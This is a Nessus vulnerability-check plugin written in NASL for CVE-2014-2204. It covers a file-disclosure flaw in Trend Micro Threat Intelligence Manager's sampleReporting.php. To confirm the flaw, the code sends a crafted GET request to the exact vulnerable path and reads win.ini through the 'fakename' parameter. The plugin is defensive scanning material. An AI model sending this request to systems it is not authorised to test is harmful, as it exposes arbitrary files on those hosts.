#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(84917);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/07/23 15:18:08 $");

  script_cve_id("CVE-2014-2204");
  script_osvdb_id(124484);

  script_name(english:"Trend Micro Threat Intelligence Manager sampleReporting.php 'fakename' Parameter File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote Windows host is affected by a
file disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Trend Micro Threat Intelligence Manager running on
the remote Windows host is affected by a file disclosure vulnerability
due to a failure to properly sanitize user-supplied input to the
'fakename' parameter in the sampleReporting.php script. A remote,
unauthenticated attacker, using a crafted request, can exploit this
to view arbitrary files.

Note that the application is reportedly affected by a local file
disclosure vulnerability and a remote code execution vulnerability;
however, Nessus has not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"https://blogs.securiteam.com/index.php/archives/2502");
  script_set_attribute(attribute:"see_also", value:"http://esupport.trendmicro.com/solution/en-US/1103000.aspx");
  script_set_attribute(attribute:"solution", value:
"Apply Threat Intelligence Manager 1.0 Patch 5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/04/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/07/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:trend_micro:threat_intelligence_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("trendmicro_tim_detect.nbin", "os_fingerprint.nasl");
  script_require_keys("installed_sw/Trend Micro Threat Intelligence Manager");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Trend Micro Threat Intelligence Manager";
get_install_count(app_name:app, exit_if_zero:TRUE);

# Can only be installed on Windows hosts.
os = get_kb_item("Host/OS");
if (!os || "Windows" >!< os) audit(AUDIT_OS_NOT, "affected");

port = get_http_port(default:443, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

files = make_list('\\windows\\win.ini', '\\winnt\\win.ini');

file_pats = make_array();
file_pats['\\winnt\\win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['\\windows\\win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

vuln = FALSE;
url = "/widget_framework2/repository/widgetPool/wp1/widget_backup/modSample3/sampleReporting.php?fakename=";

foreach file (files)
{
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : url + file,
    exit_on_fail : TRUE
  );
  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : file,
  request     : make_list(build_url(qs:url+file, port:port)),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
exit(0);

